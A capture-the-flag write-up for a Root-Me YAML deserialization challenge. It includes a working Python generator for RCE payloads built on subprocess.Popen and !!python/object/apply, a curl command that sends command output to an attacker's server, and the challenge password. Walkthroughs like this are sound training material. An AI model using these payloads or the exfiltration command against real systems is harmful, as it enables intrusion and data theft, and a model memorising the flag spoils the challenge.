# Yaml - Deserialization

When you open the chall, this is what you will see

![anh1]()

Take a look at the HTTP request which we sent to the server, you will see that there's nothing seems to be injectable. However, if you look at the url, you will notice that the path of it is encoded in base64. The url is `http://challenge01.root-me.org:59071/eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpbml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg`. Decode the `eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpbml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg` part of the url and this is what you will get: `yaml: We are currently initializing our new site ! `. Try to change the part behind `yaml:` to `Hello world`, then base64 encode it and paste it in the url to check if we can inject the url or not.

![anh2]()

So we know that the url is injectable, it's yaml deserialization attack. Please read [this document](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter) to understand what yaml deserialization is. From the document, we know that this attack can lead to RCE and we can leverage that RCE to steal the admin password.

Why do we have to use RCE when we can just exploit it directly? Because when you execuse the command with `subprocess`, you will get a line like `<subprocess.Popen object at 0x7fa4b29509a0>` first, follow after that is the result of you command. But the challenge is only return a first line when you executed the code, so we must find another way.

![anh3]()

Thank to this [Python deserialization attack payload generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator), I can write my own code to exploit this chall. This challenge requires the payload to have the `yaml:` part before the payload, so we can't just use the original Github repos above. This is my code to exploit this challenge:

```python

import yaml
import subprocess
import base64


class Payload(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return (subprocess.Popen, (self.payload,))


data = input("Enter RCE command: ")
if "\"" in data:
	quotesData = base64.b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gcHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJw==") + \
        base64.b64encode(bytes(data, 'utf-8')) + base64.b64decode("JykuZGVjb2RlKCkpKSI=")
	newData = "yaml: " + quotesData.decode('utf-8')
	print(base64.b64encode(bytes(newData,'utf-8')))
else:
	ctf = {"yaml": Payload(tuple(data.split(" ")))}
	obj = yaml.dump(ctf)
	print(obj)
	newData = base64.b64encode(bytes(obj, 'utf-8'))
	print(newData)

```

I will briefly explain the above code.  My code will generate the payload to exploit the challenge with the formula `yaml: + payload`. If the payload have double quotes in it, we have to make a payload manually (not using `yaml.dump()`) because I haven't find out how to make a double quotes payload working with `yaml.dump()`. You can debug the `if` condition to understand why I write the code like that.

With the code above, we just need to enter the command we want to use and it will automatically generate the payload. I have already tried to use reverse shell, but whenever the server connect to my port, it automatically disconnect after a few seconds later. So I switch to another method, which is send data to a third-party server using `curl`.

The command I used to exploit is `curl -i -H "Content-Type: text/plain" -X POST --data "$(<command>)" <yourserver>`. Now I will explain why I write the command like that.

In linux, you can execute a linux command using `$()`. Using this method, you can send execute the command and send it to a third-party server with `curl`. So if I use `curl -i -H "Content-Type: text/plain" -X POST --data "$(ls -a)" `, I will list all the directories in the server and send it to my server.

![anh4]()

Go to my server to check if anything happened

![anh5]()

Good. Then read the `.password` file and we are done.

![anh6]()

The password is in the body of the request. It is `561385a008727f860eda1afb7f8eba76`.